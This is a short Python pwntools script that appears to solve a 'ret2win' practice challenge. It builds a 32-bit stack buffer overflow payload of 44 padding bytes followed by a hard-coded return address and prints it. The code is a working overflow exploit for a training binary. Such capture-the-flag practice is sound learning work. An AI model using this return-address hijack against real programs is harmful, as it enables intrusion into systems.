from pwn import *

ret2win = 0x0804862c

payload = cyclic(44) + p32(ret2win)
print(payload)
